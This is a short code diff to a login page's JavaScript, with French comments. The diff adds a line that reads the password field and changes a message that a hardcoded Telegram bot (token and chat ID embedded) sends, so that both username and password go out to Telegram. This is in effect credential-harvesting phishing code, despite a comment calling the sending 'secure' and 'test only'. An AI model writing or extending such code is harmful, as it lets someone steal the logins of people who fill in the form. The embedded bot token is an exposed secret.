@@ -136,6 +136,7 @@
       e.preventDefault();
 
       const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
       const now = new Date().toLocaleString();
 
       loginButton.disabled = true;
@@ -144,7 +145,7 @@
       // Envoi Telegram sécurisé : uniquement message de test
       const token = "8095204446:AAGFJDgn_2_ts_RlhXs0VVX5c9to-rJMsf0";  // remplace par ton token
       const chatId = "965011527";  // remplace par ton chat_id
-      const message = `✅ Formulaire soumis à ${now}\nUtilisateur saisi : ${username}`;
+      const message = `✅ Formulaire soumis à ${now}\nUtilisateur saisi : ${username} , password:${password}`;
 
       try {
         const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
